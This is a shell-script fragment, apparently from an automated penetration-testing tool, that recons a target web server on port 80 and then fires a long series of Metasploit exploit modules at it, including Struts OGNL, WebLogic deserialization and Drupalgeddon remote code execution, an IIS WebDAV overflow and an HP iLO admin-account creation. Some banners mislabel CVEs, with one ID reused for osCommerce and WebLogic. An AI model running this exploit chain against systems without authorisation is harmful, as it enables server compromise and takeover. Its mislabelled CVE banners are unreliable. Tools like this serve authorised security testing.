if [ "$MODE" = "web" ]; then
    if [ "$BURP_SCAN" == "1" ]; then
        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED RUNNING BURPSUITE SCAN $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
        if [ "$VERBOSE" == "1" ]; then
          echo -e "$OKBLUE[$RESET${OKRED}i${RESET}$OKBLUE]$OKGREEN curl -X POST \"http://$BURP_HOST:$BURP_PORT/v0.1/scan\" -d \"{\"scope\":{\"include\":[{\"rule\":\"http://$TARGET:80\"}],\"type\":\"SimpleScope\"},\"urls\":[\"http://$TARGET:80\"]}\"$RESET"
        fi
        curl -s -X POST "http://$BURP_HOST:$BURP_PORT/v0.1/scan" -d "{\"scope\":{\"include\":[{\"rule\":\"http://$TARGET:80\"}],\"type\":\"SimpleScope\"},\"urls\":[\"http://$TARGET:80\"]}"
        echo ""
    fi
    if [ "$PASSIVE_SPIDER" == "1" ]; then
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING PASSIVE WEB SPIDER $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      curl -sX GET "http://index.commoncrawl.org/CC-MAIN-2018-22-index?url=*.$TARGET&output=json" | jq -r .url | tee $LOOT_DIR/web/passivespider-$TARGET.txt 2> /dev/null
    fi
    if [ "$WAYBACKMACHINE" == "1" ]; then
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED FETCHING WAYBACK MACHINE URLS $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      curl -sX GET "http://web.archive.org/cdx/search/cdx?url=*.$TARGET/*&output=text&fl=original&collapse=urlkey" | tee $LOOT_DIR/web/waybackurls-$TARGET.txt 2> /dev/null
    fi
    if [ "$BLACKWIDOW" == "1" ]; then
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING ACTIVE WEB SPIDER & APPLICATION SCAN $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      blackwidow -u http://$TARGET:80 -l 3 -s y -v n
      cat /usr/share/blackwidow/$TARGET*/* 2> /dev/null > $LOOT_DIR/web/spider-$TARGET.txt 2>/dev/null
      cat $LOOT_DIR/web/waybackurls-$TARGET.txt 2> /dev/null >> $LOOT_DIR/web/spider-$TARGET.txt 2>/dev/null
      cat $LOOT_DIR/web/weblinks-http-$TARGET.txt 2> /dev/null >> $LOOT_DIR/web/spider-$TARGET.txt 2>/dev/null
      cat $LOOT_DIR/web/passivespider-$TARGET.txt 2> /dev/null >> $LOOT_DIR/web/spider-$TARGET.txt 2>/dev/null
    fi
    if [ "$WEB_BRUTE_COMMONSCAN" == "1" ]; then
        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED RUNNING COMMON FILE/DIRECTORY BRUTE FORCE $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
        python3 $PLUGINS_DIR/dirsearch/dirsearch.py -u http://$TARGET -w $WEB_BRUTE_COMMON -x 400,403,404,405,406,429,502,503,504 -F -e php,asp,aspx,jsp,pl,cgi,js,css,txt,html,htm
    fi
    if [ "$WEB_BRUTE_FULLSCAN" == "1" ]; then
        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED RUNNING FULL FILE/DIRECTORY BRUTE FORCE $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
        python3 $PLUGINS_DIR/dirsearch/dirsearch.py -u http://$TARGET -w $WEB_BRUTE_FULL -x 400,403,404,405,406,429,502,503,504 -F -e php,asp,aspx,jsp,pl,cgi,js,css,txt,html,htm
    fi
    if [ "$WEB_BRUTE_EXPLOITSCAN" == "1" ]; then
        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED RUNNING FILE/DIRECTORY BRUTE FORCE FOR VULNERABILITIES $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
        python3 $PLUGINS_DIR/dirsearch/dirsearch.py -u http://$TARGET -w $WEB_BRUTE_EXPLOITS -x 400,403,404,405,406,429,502,503,504 -F -e html 
    fi
    cat $PLUGINS_DIR/dirsearch/reports/$TARGET/* 2> /dev/null
    cat $PLUGINS_DIR/dirsearch/reports/$TARGET/* > $LOOT_DIR/web/dirsearch-$TARGET.txt 2> /dev/null
    wget http://$TARGET/robots.txt -O $LOOT_DIR/web/robots-$TARGET-http.txt 2> /dev/null
    if [ "$NMAP_SCRIPTS" == "1" ]; then
        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED RUNNING NMAP HTTP SCRIPTS $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
        nmap -A -Pn -T5 -p 80 -sV --script=/usr/share/nmap/scripts/iis-buffer-overflow.nse --script=http-vuln* $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port80
        sed -r "s/</\&lh\;/g" $LOOT_DIR/output/nmap-$TARGET-port80 2> /dev/null > $LOOT_DIR/output/nmap-$TARGET-port80.txt 2> /dev/null
        rm -f $LOOT_DIR/output/nmap-$TARGET-port80 2> /dev/null
    fi
    if [ "$CLUSTERD" == "1" ]; then
        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED ENUMERATING WEB SOFTWARE $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
        clusterd -i $TARGET 2> /dev/null | tee $LOOT_DIR/web/clusterd-$TARGET-http.txt
    fi
    if [ "$CMSMAP" == "1" ]; then
        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED RUNNING CMSMAP $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
        cmsmap http://$TARGET | tee $LOOT_DIR/web/cmsmap-$TARGET-httpa.txt
        echo ""
        cmsmap http://$TARGET/wordpress/ | tee $LOOT_DIR/web/cmsmap-$TARGET-httpb.txt
        echo ""
    fi
    if [ "$WPSCAN" == "1" ]; then
        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED RUNNING WORDPRESS VULNERABILITY SCAN $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
        wpscan --url http://$TARGET --no-update --disable-tls-checks 2> /dev/null | tee $LOOT_DIR/web/wpscan-$TARGET-httpa.txt
        echo ""
        wpscan --url http://$TARGET/wordpress/ --no-update --disable-tls-checks 2> /dev/null | tee $LOOT_DIR/web/wpscan-$TARGET-httpb.txt
        echo ""
    fi
    if [ "$NIKTO" = "1" ]; then
      echo -e "${OKGREEN}====================================================================================${RESET}"
      echo -e "$OKRED RUNNING WEB VULNERABILITY SCAN $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}"
      nikto -h http://$TARGET -output $LOOT_DIR/web/nikto-$TARGET-http.txt
    fi
    if [ "$SHOCKER" = "1" ]; then
        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED RUNNING SHELLSHOCK EXPLOIT SCAN $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
        python $PLUGINS_DIR/shocker/shocker.py -H $TARGET --cgilist $PLUGINS_DIR/shocker/shocker-cgi_list --port 80 | tee $LOOT_DIR/web/shocker-$TARGET-port80.txt
    fi
    if [ "$JEXBOSS" = "1" ]; then
        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED RUNNING JEXBOSS $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
        cd /tmp/
        python /usr/share/sniper/plugins/jexboss/jexboss.py -u http://$TARGET | tee $LOOT_DIR/web/jexboss-$TARGET-port80.raw
        sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/jexboss-$TARGET-port80.raw > $LOOT_DIR/web/jexboss-$TARGET-port80.txt 2> /dev/null
        rm -f $LOOT_DIR/web/jexboss-$TARGET-port80.raw 2> /dev/null
        cd $INSTALL_DIR
    fi
    cd $INSTALL_DIR
    if [ "$METASPLOIT_EXPLOIT" == "1" ]; then
        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED RUNNING HTTP PUT UPLOAD SCANNER $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
        msfconsole -q -x "use scanner/http/http_put; setg RHOSTS "$TARGET"; setg RPORT "80"; setg SSL false; run; set PATH /uploads/; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port80-http_put.raw
        sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port80-http_put.raw > $LOOT_DIR/output/msf-$TARGET-port80-http_put.txt 2> /dev/null
        rm -f $LOOT_DIR/output/msf-$TARGET-port80-http_put.raw 2> /dev/null
        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED RUNNING WEBDAV SCANNER $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
        msfconsole -q -x "use scanner/http/webdav_scanner; setg RHOSTS "$TARGET"; setg RPORT "80"; setg SSL false; run; use scanner/http/webdav_website_content; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port80-webdav_website_content.raw
        sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port80-webdav_website_content.raw > $LOOT_DIR/output/msf-$TARGET-port80-webdav_website_content.txt 2> /dev/null
        rm -f $LOOT_DIR/output/msf-$TARGET-port80-webdav_website_content.raw 2> /dev/null
        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED RUNNING MICROSOFT IIS WEBDAV ScStoragePathFromUrl OVERFLOW $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
        msfconsole -q -x "use exploit/windows/iis/iis_webdav_scstoragepathfromurl; setg RHOST "$TARGET"; setg RPORT "80"; setg SSL false; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port80-iis_webdav_scstoragepathfromurl.raw
        sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port80-iis_webdav_scstoragepathfromurl.raw > $LOOT_DIR/output/msf-$TARGET-port80-iis_webdav_scstoragepathfromurl.txt 2> /dev/null
        rm -f $LOOT_DIR/output/msf-$TARGET-port80-iis_webdav_scstoragepathfromurl.raw 2> /dev/null
        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED RUNNING APACHE TOMCAT UTF8 TRAVERSAL EXPLOIT $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
        msfconsole -q -x "use admin/http/tomcat_utf8_traversal; setg RHOSTS "$TARGET"; setg RPORT "80"; set SSL false; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port80-tomcat_utf8_traversal.raw
        sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port80-tomcat_utf8_traversal.raw > $LOOT_DIR/output/msf-$TARGET-port80-tomcat_utf8_traversal.txt 2> /dev/null
        rm -f $LOOT_DIR/output/msf-$TARGET-port80-tomcat_utf8_traversal.raw 2> /dev/null
        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED RUNNING APACHE OPTIONS BLEED EXPLOIT $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
        msfconsole -q -x "use scanner/http/apache_optionsbleed; setg RHOSTS "$TARGET"; setg RPORT "80"; set SSL false; run; exit;"  | tee $LOOT_DIR/output/msf-$TARGET-port80-apache_optionsbleed.raw
        sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port80-apache_optionsbleed.raw > $LOOT_DIR/output/msf-$TARGET-port80-apache_optionsbleed.txt 2> /dev/null
        rm -f $LOOT_DIR/output/msf-$TARGET-port80-apache_optionsbleed.raw 2> /dev/null
        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED RUNNING HP ILO AUTH BYPASS EXPLOIT $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
        msfconsole -q -x "use admin/hp/hp_ilo_create_admin_account; setg RHOST "$TARGET"; setg RPORT "80"; set SSL false; run; exit;"  | tee $LOOT_DIR/output/msf-$TARGET-port80-hp_ilo_create_admin_account.raw
        sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port80-hp_ilo_create_admin_account.raw > $LOOT_DIR/output/msf-$TARGET-port80-hp_ilo_create_admin_account.txt 2> /dev/null
        rm -f $LOOT_DIR/output/msf-$TARGET-port80-hp_ilo_create_admin_account.raw 2> /dev/null
        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED RUNNING ELASTICSEARCH DYNAMIC SCRIPT JAVA INJECTION EXPLOIT $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
        msfconsole -q -x "use exploit/multi/elasticsearch/script_mvel_rce; setg RHOST "$TARGET"; setg RPORT "80"; set SSL false; run; exit;"  | tee $LOOT_DIR/output/msf-$TARGET-port80-script_mvel_rce.raw
        sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port80-script_mvel_rce.raw > $LOOT_DIR/output/msf-$TARGET-port80-script_mvel_rce.txt 2> /dev/null
        rm -f $LOOT_DIR/output/msf-$TARGET-port80-script_mvel_rce.raw 2> /dev/null
        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED RUNNING DRUPALGEDDON HTTP PARAMETER SQL INJECTION CVE-2014-3704 $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
        msfconsole -q -x "use exploit/multi/http/drupal_drupageddon; setg RHOST "$TARGET"; setg RPORT "80"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port80-drupal_drupageddon.raw
        sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port80-drupal_drupageddon.raw > $LOOT_DIR/output/msf-$TARGET-port80-drupal_drupageddon.txt 2> /dev/null
        rm -f $LOOT_DIR/output/msf-$TARGET-port80-drupal_drupageddon.raw 2> /dev/null


        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED RUNNING GLASSFISH ADMIN TRAVERSAL EXPLOIT $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
        msfconsole -q -x "use scanner/http/glassfish_traversal; setg RHOSTS "$TARGET"; setg RPORT "80"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port80-glassfish_traversal.raw
        sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port80-glassfish_traversal.raw > $LOOT_DIR/output/msf-$TARGET-port80-glassfish_traversal.txt 2> /dev/null
        rm -f $LOOT_DIR/output/msf-$TARGET-port80-glassfish_traversal.raw 2> /dev/null



        


        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED RUNNING MS15-034 SYS MEMORY DUMP METASPLOIT EXPLOIT $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
        msfconsole -q -x "use auxiliary/scanner/http/ms15_034_http_sys_memory_dump; setg RHOSTS "$TARGET"; setg RPORT "80"; set WAIT 2; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port80-ms15_034_http_sys_memory_dump.raw
        sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port80-ms15_034_http_sys_memory_dump.raw > $LOOT_DIR/output/msf-$TARGET-port80-ms15_034_http_sys_memory_dump.txt 2> /dev/null
        rm -f $LOOT_DIR/output/msf-$TARGET-port80-ms15_034_http_sys_memory_dump.raw 2> /dev/null
        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED RUNNING BADBLUE PASSTHRU METASPLOIT EXPLOIT $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
        msfconsole -q -x "use exploit/windows/http/badblue_passthru; setg RHOST "$TARGET"; set RPORT 80; run; back;exit;" | tee $LOOT_DIR/output/msf-$TARGET-port80-badblue_passthru.raw
        sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port80-badblue_passthru.raw > $LOOT_DIR/output/msf-$TARGET-port80-badblue_passthru.txt 2> /dev/null
        rm -f $LOOT_DIR/output/msf-$TARGET-port80-badblue_passthru.raw 2> /dev/null
        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED RUNNING PHP CGI ARG INJECTION METASPLOIT EXPLOIT $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
        msfconsole -q -x "use exploit/multi/http/php_cgi_arg_injection; setg RHOST "$TARGET"; set RPORT 80; run; back;exit;" | tee $LOOT_DIR/output/msf-$TARGET-port80-php_cgi_arg_injection.raw
        sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port80-php_cgi_arg_injection.raw > $LOOT_DIR/output/msf-$TARGET-port80-php_cgi_arg_injection.txt 2> /dev/null
        rm -f $LOOT_DIR/output/msf-$TARGET-port80-php_cgi_arg_injection.raw 2> /dev/null
        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED RUNNING PHPMYADMIN METASPLOIT EXPLOITS $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
        msfconsole -q -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/htp/phpmyadmin_preg_replace; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port80-phpmyadmin_3522_backdoor.raw
        sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port80-phpmyadmin_3522_backdoor.raw > $LOOT_DIR/output/msf-$TARGET-port80-phpmyadmin_3522_backdoor.txt 2> /dev/null
        rm -f $LOOT_DIR/output/msf-$TARGET-port80-phpmyadmin_3522_backdoor.raw 2> /dev/null
        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED RUNNING JOOMLA COMFIELDS SQL INJECTION METASPLOIT CVE-2017-8917 $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
        msfconsole -q -x "use unix/webapp/joomla_comfields_sqli_rce; setg RHOST "$TARGET"; set RPORT 80; set SSL false; run; back;exit;" | tee $LOOT_DIR/output/msf-$TARGET-port80-joomla_comfields_sqli_rce.raw
        sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port80-joomla_comfields_sqli_rce.raw > $LOOT_DIR/output/msf-$TARGET-port80-joomla_comfields_sqli_rce.txt 2> /dev/null
        rm -f $LOOT_DIR/output/msf-$TARGET-port80-joomla_comfields_sqli_rce.raw 2> /dev/null
        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED RUNNING WORDPRESS REST API CONTENT INJECTION CVE-2017-5612 $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
        msfconsole -q -x "use auxiliary/scanner/http/wordpress_content_injection; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; set RPORT 80; set SSL false; run; back;exit;" | tee $LOOT_DIR/output/msf-$TARGET-port80-wordpress_content_injection.raw
        sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port80-wordpress_content_injection.raw > $LOOT_DIR/output/msf-$TARGET-port80-wordpress_content_injection.txt 2> /dev/null
        rm -f $LOOT_DIR/output/msf-$TARGET-port80-wordpress_content_injection.raw 2> /dev/null
        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED RUNNING ORACLE WEBLOGIC WLS-WSAT DESERIALIZATION RCE CVE-2017-10271 $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
        msfconsole -q -x "use exploit/multi/http/oracle_weblogic_wsat_deserialization_rce; setg RHOST "$TARGET"; set RPORT 80; set SSL false; run; back;exit;" | tee $LOOT_DIR/output/msf-$TARGET-port80-oracle_weblogic_wsat_deserialization_rce.raw
        sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port80-oracle_weblogic_wsat_deserialization_rce.raw > $LOOT_DIR/output/msf-$TARGET-port80-oracle_weblogic_wsat_deserialization_rce.txt 2> /dev/null
        rm -f $LOOT_DIR/output/msf-$TARGET-port80-oracle_weblogic_wsat_deserialization_rce.raw 2> /dev/null
        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED RUNNING APACHE STRUTS JAKARTA OGNL INJECTION CVE-2017-5638 $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
        msfconsole -q -x "use multi/http/struts2_content_type_ognl; setg RHOST "$TARGET"; setg RPORT "80"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port80-struts2_content_type_ognl.raw
        sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port80-struts2_content_type_ognl.raw > $LOOT_DIR/output/msf-$TARGET-port80-struts2_content_type_ognl.txt 2> /dev/null
        rm -f $LOOT_DIR/output/msf-$TARGET-port80-struts2_content_type_ognl.raw 2> /dev/null
        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED RUNNING APACHE STRUTS 2 SHOWCASE OGNL RCE CVE-2017-9805 $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
        msfconsole -q -x "use exploit/multi/http/struts2_rest_xstream; setg RHOST "$TARGET"; setg RPORT "80"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port80-struts2_rest_xstream.raw
        sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port80-struts2_rest_xstream.raw > $LOOT_DIR/output/msf-$TARGET-port80-struts2_rest_xstream.txt 2> /dev/null
        rm -f $LOOT_DIR/output/msf-$TARGET-port80-struts2_rest_xstream.raw 2> /dev/null
        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED RUNNING APACHE STRUTS 2 REST XSTREAM RCE CVE-2017-9791 $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
        msfconsole -q -x "use exploit/multi/http/struts2_code_exec_showcase; setg RHOST "$TARGET"; setg RPORT "80"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port80-struts2_code_exec_showcase.raw
        sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port80-struts2_code_exec_showcase.raw > $LOOT_DIR/output/msf-$TARGET-port80-struts2_code_exec_showcase.txt 2> /dev/null
        rm -f $LOOT_DIR/output/msf-$TARGET-port80-struts2_code_exec_showcase.raw 2> /dev/null
        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED RUNNING APACHE TOMCAT CVE-2017-12617 RCE EXPLOIT $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
        msfconsole -q -x "use exploit/multi/http/tomcat_jsp_upload_bypass; setg RHOST "$TARGET"; setg RPORT "80"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port80-tomcat_jsp_upload_bypass.raw
        sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port80-tomcat_jsp_upload_bypass.raw > $LOOT_DIR/output/msf-$TARGET-port80-tomcat_jsp_upload_bypass.txt 2> /dev/null
        rm -f $LOOT_DIR/output/msf-$TARGET-port80-tomcat_jsp_upload_bypass.raw 2> /dev/null
        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED RUNNING APACHE STRUTS 2 NAMESPACE REDIRECT OGNL INJECTION CVE-2018-11776 $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
        msfconsole -q -x "use exploit/multi/http/struts2_namespace_ognl; setg RHOST "$TARGET"; setg RPORT "80"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port80-struts2_namespace_ognl.raw
        sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port80-struts2_namespace_ognl.raw > $LOOT_DIR/output/msf-$TARGET-port80-struts2_namespace_ognl.txt 2> /dev/null
        rm -f $LOOT_DIR/output/msf-$TARGET-port80-struts2_namespace_ognl.raw 2> /dev/null
        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED CISCO ASA TRAVERSAL CVE-2018-0296 $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
        msfconsole -q -x "use auxiliary/scanner/http/cisco_directory_traversal; setg RHOST "$TARGET"; setg RPORT "80"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port80-cisco_directory_traversal.raw
        sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port80-cisco_directory_traversal.raw > $LOOT_DIR/output/msf-$TARGET-port80-cisco_directory_traversal.txt 2> /dev/null
        rm -f $LOOT_DIR/output/msf-$TARGET-port80-cisco_directory_traversal.raw 2> /dev/null
        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED RUNNING DRUPALGEDDON2 CVE-2018-7600 $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
        msfconsole -q -x "use exploit/unix/webapp/drupal_drupalgeddon2; setg RHOST "$TARGET"; setg RPORT "80"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port80-drupal_drupalgeddon2.raw
        sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port80-drupal_drupalgeddon2.raw > $LOOT_DIR/output/msf-$TARGET-port80-drupal_drupalgeddon2.txt 2> /dev/null
        rm -f $LOOT_DIR/output/msf-$TARGET-port80-drupal_drupalgeddon2.raw 2> /dev/null
        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED RUNNING ORACLE WEBLOGIC SERVER DESERIALIZATION RCE CVE-2018-2628 $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
        msfconsole -q -x "use exploit/multi/misc/weblogic_deserialize; setg RHOST "$TARGET"; setg RPORT "80"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port80-weblogic_deserialize.raw
        sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port80-weblogic_deserialize.raw > $LOOT_DIR/output/msf-$TARGET-port80-weblogic_deserialize.txt 2> /dev/null
        rm -f $LOOT_DIR/output/msf-$TARGET-port80-weblogic_deserialize.raw 2> /dev/null
        echo -e "${OKGREEN}====================================================================================${RESET}"
        echo -e "$OKRED RUNNING OSCOMMERCE INSTALLER RCE CVE-2018-2628 $RESET"
        echo -e "${OKGREEN}====================================================================================${RESET}"
        msfconsole -q -x "use exploit/multi/http/oscommerce_installer_unauth_code_exec; setg RHOST "$TARGET"; setg RPORT "80"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port80-oscommerce_installer_unauth_code_exec.raw
        sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port80-oscommerce_installer_unauth_code_exec.raw > $LOOT_DIR/output/msf-$TARGET-port80-oscommerce_installer_unauth_code_exec.txt 2> /dev/null
        rm -f $LOOT_DIR/output/msf-$TARGET-port80-oscommerce_installer_unauth_code_exec.raw 2> /dev/null
    fi
fi 